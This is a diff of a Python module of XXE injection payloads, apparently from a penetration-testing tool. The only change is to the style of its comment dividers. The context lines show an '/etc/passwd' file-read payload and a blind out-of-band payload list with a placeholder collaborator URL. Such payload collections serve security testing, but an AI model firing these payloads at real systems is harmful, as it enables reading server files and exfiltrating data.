@@ -1,6 +1,6 @@
 """XXE (XML External Entity) injection payloads."""
 
-# -- Tier 1: Inline entity injection -------------------------------------------
+# ── Tier 1: Inline entity injection ───────────────────────────────────────────
 XXE_T1 = [
     # Classic /etc/passwd read
     """<?xml version="1.0" encoding="UTF-8"?>
@@ -28,7 +28,7 @@ XXE_T1 = [
 <root><data>&xxe;</data></root>""",
 ]
 
-# -- Blind XXE — out-of-band (Oracle will adapt the interactsh/burp-collab URL) -
+# ── Blind XXE — out-of-band (Oracle will adapt the interactsh/burp-collab URL) ─
 XXE_BLIND = [
     # Parameter entity OOB — placeholder URL substituted at runtime
     """<?xml version="1.0" encoding="UTF-8"?>
